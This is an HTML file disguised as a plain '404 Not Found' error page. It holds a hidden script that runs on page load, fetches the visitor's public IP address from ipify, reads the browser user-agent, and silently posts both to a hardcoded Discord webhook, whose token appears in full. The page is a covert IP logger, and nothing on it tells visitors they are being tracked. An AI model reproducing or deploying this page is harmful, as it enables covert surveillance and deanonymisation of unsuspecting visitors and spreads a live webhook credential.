<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>404 Not Found</title>
  <style>
    body {
      background-color: #fff;
      color: #222;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h1 {
      font-size: 3em;
      color: #d00;
    }
    p {
      font-size: 1.2em;
    }
  </style>
</head>
<body>
  <h1>404 Not Found</h1>
  <p>The requested resource was not found on this server.</p>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1421207807742574612/jaMdF-rsDp1IwkBeP18gVtGLzDAMb5yokipsYPq7GPBDG58jYKlUrdgzKoAh94vn9ZOp";

    // Fetch public IP from ipify
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const userAgent = navigator.userAgent;

        // Build the Discord embed
        const payload = {
          embeds: [
            {
              title: "üì• New entry üì•",
              color: 3447003,
              fields: [
                {
                  name: "üåê IP Address",
                  value: "```" + ip + "```",
                  inline: false
                },
                {
                  name: "üß≠ User-Agent",
                  value: "```" + userAgent + "```",
                  inline: false
                }
              ],
              timestamp: new Date().toISOString()
            }
          ]
        };

        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        }).catch(console.error);
      })
      .catch(console.error);
  </script>
</body>
</html>
